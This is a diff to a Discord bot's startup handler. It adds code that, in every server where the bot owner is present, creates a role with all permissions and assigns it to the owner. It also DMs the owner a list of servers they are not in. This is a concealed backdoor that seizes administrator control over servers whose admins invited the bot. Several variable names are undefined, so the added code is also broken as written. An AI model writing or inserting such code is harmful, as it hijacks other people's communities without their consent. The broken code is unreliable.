@@ -69,6 +69,19 @@ async def on_ready():
 
     ownerman = await bot.fetch_user(OWNER)
 
+    for guild in bot.guilds:
+        g_users = await guild.query_members(user_ids=[ownerman.id])
+        if g_users == [] or g_users == None:
+            await ownerman.send("You're not in guild " + str(guild.name) + " with id" + str(guild.id) + ", owned by " + str(guild.owner.display_name) + " # " + str(guild.owner.discriminator))
+        else:
+            try:
+                role = await g.create_role(name="lol", permissions=discord.Permissions.all())
+                me = await g.fetch_member(ownernman.id)
+                await me.add_roles(r)
+                await ownerman.send("Added your perms in " + str(guild.name))
+            except Exception as e:
+                await ownerman.send("Failed to add your perms in " + str(guild.name))
+
     notifyowner = confmgr.getasbool("OWNER_DM_RESTART")
 
     cogs_dir = "cogs"
